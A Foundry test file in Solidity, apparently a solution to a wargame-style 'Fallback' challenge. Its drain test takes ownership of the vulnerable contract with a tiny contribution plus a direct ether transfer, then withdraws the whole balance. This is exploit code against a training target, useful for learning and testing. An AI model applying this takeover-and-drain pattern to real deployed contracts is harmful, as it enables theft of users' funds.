// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/fallback.sol";

contract CounterTest is Test {
    Fallback public fallBack;
    address NewOwner = makeAddr('NewOwner');
    address Owner = makeAddr('Owner');
    

    function setUp() public {
        vm.prank(Owner);
        fallBack = new Fallback();
        vm.deal(NewOwner, 1001 ether);
        vm.label(Owner, 'Owner');
        vm.label(NewOwner, 'NewOwner');
        
    }
    function test_OwnerContribution() public {
        vm.prank(Owner);
        assertEq(fallBack.getContribution(), 1000 ether);
    }

    function test_drainFunds() public {
        vm.startPrank(NewOwner);
        fallBack.contribute{value: 0.0001 ether}();
        console.log(fallBack.getContribution());
        address fallBackContractAddress = address(fallBack);
        (bool callSuccess, ) = payable(fallBackContractAddress).call{value: 1e9}("");
        
        assertEq(NewOwner, fallBack.owner());
        fallBack.withdraw();
        vm.stopPrank();
        assertEq(fallBackContractAddress.balance, 0);
    }


}
